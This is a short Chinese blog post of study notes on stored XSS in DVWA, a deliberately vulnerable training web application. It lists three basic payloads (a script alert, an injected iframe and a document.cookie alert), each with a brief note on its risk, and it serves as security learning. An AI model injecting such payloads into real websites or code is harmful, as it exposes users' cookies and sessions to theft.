---
title: dvwa笔记
tags: [Web漏洞]
categories: [网络安全]
date: 2016-02-04 22:05:18
---


## 存储型XSS
### 1. 基本的xss

``` html
<script>alert("hello")</script>
```

危害: 攻击者可以轻松的以中间人身份捕获 cookie/session。 

![](http://ww2.sinaimg.cn/large/5e515a93gw1f0nfqzmo2mj20g209y75d.jpg)

<!-- more -->

### 2. iframe xss

``` html
<iframe src="http://www.baidu.com></iframe>
```

危害：攻击者可以在其中嵌入自己的恶意网页

![](http://ww2.sinaimg.cn/large/5e515a93gw1f0nfroh3dsj20e507rwew.jpg)



### 3. cookie xss

``` html
<script>alert(document.cookie);</script>
```

危害：获取cookie等重要信息
![Paste_Image.png](http://ww1.sinaimg.cn/large/5e515a93gw1f0nfsr4zvxj20dw06rjs0.jpg)